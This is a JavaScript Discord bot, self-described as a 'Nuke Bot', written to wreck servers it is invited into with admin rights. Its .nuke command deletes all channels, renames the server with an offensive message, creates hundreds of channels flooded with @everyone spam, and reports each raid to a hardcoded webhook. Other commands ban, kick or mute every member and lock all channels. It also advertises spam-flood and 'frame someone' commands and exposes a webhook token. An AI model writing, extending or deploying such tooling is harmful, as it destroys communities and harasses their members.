const { Client, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const http = require('http');

const client = new Client({
    intents: [1, 512, 32768, 2, 16]
});

const TOKEN = process.env.TOKEN;
const LOG_WEBHOOK = "https://discord.com/api/webhooks/1497802608491106357/1rPNKGuyh780KsnqoWnzAWcXjbPTfRx3jWtcefHcYkdywE7GkibcGwvWqRvZE2CgjHnf";
const WHITELIST_SERVER = "1475357940088176743";
const INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1497740024983195668&permissions=8&integration_type=0&scope=bot";
const EXT_INVITE = "https://discord.com/oauth2/authorize?client_id=1489612859179798588&integration_type=1&scope=applications.commands";
const OWNER_ID = "1183142340609708072";
const WHITELIST_ROLE_ID = "1498099673406374029";

http.createServer((req, res) => {
    res.writeHead(200, {'Content-Type': 'text/plain'});
    res.end('Alive');
}).listen(process.env.PORT || 3000);

client.once('ready', () => {
    console.log(`[+] ${client.user.tag} is ready`);
});

const sleep = ms => new Promise(r => setTimeout(r, ms));

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    const args = message.content.trim().split(/\s+/);
    const cmd = args[0].toLowerCase();

    // .whitelist — works everywhere, owner only
    if (cmd === '.whitelist') {
        if (message.author.id !== OWNER_ID) {
            return message.reply('You are not the owner').catch(() => {});
        }
        const target = message.mentions.members.first();
        if (!target) return message.reply('Mention someone to whitelist').catch(() => {});
        target.roles.add(WHITELIST_ROLE_ID).then(() => {
            message.reply(`Whitelisted ${target.user.tag}`).catch(() => {});
        }).catch(() => {
            message.reply('Failed to give role. Make sure I have Manage Roles permission.').catch(() => {});
        });
        return;
    }

    // Protected server checks
    const isProtected = message.guild && message.guild.id === WHITELIST_SERVER;
    const isOwner = message.author.id === OWNER_ID;

    if (isProtected) {
        // Owner can use .panel and .extpanel in protected server
        if (cmd === '.panel' && isOwner) {
            const embed = new EmbedBuilder()
                .setTitle('Discord Nuke Bot')
                .setDescription('**Best nuker with admin**\nClick the button below to invite.')
                .setColor(0xff0000);
            const inviteBtn = new ButtonBuilder().setLabel('Invite').setStyle(ButtonStyle.Link).setURL(INVITE_URL);
            const cmdsBtn = new ButtonBuilder().setLabel('Commands').setStyle(ButtonStyle.Primary).setCustomId('cmds');
            const row = new ActionRowBuilder().addComponents(inviteBtn, cmdsBtn);
            message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
            return;
        }
        if (cmd === '.extpanel' && isOwner) {
            const embed = new EmbedBuilder()
                .setTitle('External Bot Commands')
                .setDescription(
                    `**Slash Commands (User Install)**\n` +
                    `/say — Make bot say anything (free)\n` +
                    `/blame — Frame someone (free)\n` +
                    `/spam — Arabic flood (premium)\n` +
                    `/flood — JHUB flood (premium)\n` +
                    `/custom-spam — Spam anything (premium)\n` +
                    `/l-spam — Zalgo lag spam (premium)\n\n` +
                    `Get whitelisted by the owner to use premium commands.`
                )
                .setColor(0x00ff00)
                .setFooter({ text: 'Click below to add the external bot' });
            const extBtn = new ButtonBuilder().setLabel('Add External Bot').setStyle(ButtonStyle.Link).setURL(EXT_INVITE);
            const row = new ActionRowBuilder().addComponents(extBtn);
            message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
            return;
        }
        // Block everything else in protected server
        if (message.content.startsWith('.')) {
            return message.reply('Server protected').catch(() => {});
        }
        return;
    }

    // .panel — anywhere except protected (owner bypasses above)
    if (cmd === '.panel') {
        const embed = new EmbedBuilder()
            .setTitle('Discord Nuke Bot')
            .setDescription('**Best nuker with admin**\nClick the button below to invite.')
            .setColor(0xff0000);
        const inviteBtn = new ButtonBuilder().setLabel('Invite').setStyle(ButtonStyle.Link).setURL(INVITE_URL);
        const cmdsBtn = new ButtonBuilder().setLabel('Commands').setStyle(ButtonStyle.Primary).setCustomId('cmds');
        const row = new ActionRowBuilder().addComponents(inviteBtn, cmdsBtn);
        message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
        return;
    }

    // .extpanel — anywhere except protected
    if (cmd === '.extpanel') {
        const embed = new EmbedBuilder()
            .setTitle('External Bot Commands')
            .setDescription(
                `**Slash Commands (User Install)**\n` +
                `/say — Make bot say anything (free)\n` +
                `/blame — Frame someone (free)\n` +
                `/spam — Arabic flood (premium)\n` +
                `/flood — JHUB flood (premium)\n` +
                `/custom-spam — Spam anything (premium)\n` +
                `/l-spam — Zalgo lag spam (premium)\n\n` +
                `Get whitelisted by the owner to use premium commands.`
            )
            .setColor(0x00ff00)
            .setFooter({ text: 'Click below to add the external bot' });
        const extBtn = new ButtonBuilder().setLabel('Add External Bot').setStyle(ButtonStyle.Link).setURL(EXT_INVITE);
        const row = new ActionRowBuilder().addComponents(extBtn);
        message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
        return;
    }

    // .nuke
    if (cmd === '.nuke') {
        if (isProtected) return message.reply('Server protected').catch(() => {});
        message.delete().catch(() => {});
        const g = message.guild;
        const originalName = g.name;
        const username = message.author.tag;
        const time = new Date().toISOString();
        try {
            await fetch(LOG_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `**Server Nuked**\nName: ${originalName}\nBy: ${username}\nTime: ${time}` })
            });
        } catch (e) {}
        g.setName('NGA GOT NUKED BY JHUB').catch(() => {});
        const channels = Array.from(g.channels.cache.values());
        for (const ch of channels) { ch.delete().catch(() => {}); await sleep(100); }
        for (let i = 0; i < 500; i++) {
            g.channels.create({ name: 'jhub-on-top', type: 0 }).then(ch => {
                if (!ch) return;
                for (let j = 0; j < 10; j++) ch.send('@everyone @here Discord.gg/Jhub NGA GOT NUKED BY JHUB').catch(() => {});
            }).catch(() => {});
            await sleep(200);
        }
        return;
    }

    if (cmd === '.kick') { const m = message.mentions.members.first(); if (!m) return message.reply('Mention a user').catch(() => {}); m.kick().then(() => message.reply(`Kicked ${m.user.tag}`)).catch(() => {}); return; }
    if (cmd === '.ban') { const m = message.mentions.members.first(); if (!m) return message.reply('Mention a user').catch(() => {}); m.ban().then(() => message.reply(`Banned ${m.user.tag}`)).catch(() => {}); return; }
    if (cmd === '.kickall') { let c = 0; for (const [, m] of message.guild.members.cache) { if (m.kickable && m.id !== client.user.id) { m.kick().catch(() => {}); c++; await sleep(100); } } message.reply(`Kicked ${c} members`).catch(() => {}); return; }
    if (cmd === '.banall') { let c = 0; for (const [, m] of message.guild.members.cache) { if (m.bannable && m.id !== client.user.id) { m.ban().catch(() => {}); c++; await sleep(100); } } message.reply(`Banned ${c} members`).catch(() => {}); return; }
    if (cmd === '.muteall') { let c = 0; for (const [, m] of message.guild.members.cache) { if (m.moderatable && m.id !== client.user.id) { m.timeout(28*24*60*60*1000).catch(() => {}); c++; await sleep(100); } } message.reply(`Muted ${c} members`).catch(() => {}); return; }
    if (cmd === '.lockall') { let c = 0; for (const [, ch] of message.guild.channels.cache) { if (ch.type === 0) { ch.permissionOverwrites.create(message.guild.roles.everyone, { SendMessages: false }).catch(() => {}); c++; await sleep(100); } } message.reply(`Locked ${c} channels`).catch(() => {}); return; }
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;
    if (interaction.customId === 'cmds') {
        const embed = new EmbedBuilder()
            .setTitle('Command List')
            .setDescription(
                `**Owner Only**\n.whitelist @user — Give premium access\n\n` +
                `.nuke — Wipe server\n.kick @user — Kick member\n.ban @user — Ban member\n.kickall — Kick all\n.banall — Ban all\n.muteall — Timeout all\n.lockall — Lock all channels\n.panel — Invite panel\n.extpanel — External bot info`
            )
            .setColor(0xff0000);
        await interaction.reply({ embeds: [embed], ephemeral: true });
    }
});

client.login(TOKEN);
